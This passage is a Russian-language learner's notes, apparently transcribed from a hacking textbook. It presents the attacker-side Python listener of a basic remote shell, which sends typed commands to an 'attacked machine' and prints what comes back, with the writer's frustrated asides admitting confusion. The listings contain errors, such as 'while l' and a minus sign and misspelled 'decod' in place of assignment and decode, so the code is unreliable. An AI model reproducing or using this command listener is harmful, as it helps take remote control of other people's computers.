Продолжаем

Теперь основная часть:

while l:
command = str(input('Enter command:'))
client.send(command.encode())
if command.lower() == 'exit':
break
result_output = client.recv(1024).decode()
print(result_output)
client.close()
s.close()

Думаю, тебе уже знаком этот код. (не совсем, iDONi) Здесь все просто: в переменную 
command мы сохраняем введенную с клавиатуры команду, которую потом отправляем на
аиакуемую машину. (ну в учебнике создал автор очень крутые предложение, который 
не может переварить iDONi. Это очень плохо. Настанет этот день или нет. Бесишь.)
И заодно организуем себе возможность цивилизованно выйти, набрав команду exit.

Далее сохраняем то, что нам прислала атакованная машина, в переменную result_output и
выводим ее содержимое на экран. После выхода из цикла закрываем соединение с клиентом 
и с самим сервером. (Особо не понимаю, но главное пишу. На практике какая трагедия
будет, хер знает).
 Весь код будет таким:
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8888))
s.listen(5)
client, addr = s.accept()
while l:
command = str(input('Enter command:'))
client.send(command.encode())
if command.lower() == 'exit':
break
result_output - client.recv(1024).decod()
print(result_output)
client.close()
s.close()

Осталось проверить! Запскаем в одной консоли сервера (сторона атакующего), а в другой - 
клиент (атакуемый) и видим вывод в консоли сервера.

Пока не за компом, но описывается так. Создам код, нет я же скопирую но не создам,
не бери себе так много. Запускаю программу. По логике в терминале должен отразиться
слово 'Enter command'. В книге как пример вводится notepad.exe. По логике должен открываться
блокнот. Идет дальше поздравление. Но с такими нервами не до поздраления.

Попробуем открыть блокнот, написав notepad.exe. Поздравляю, твой первый шелл готов!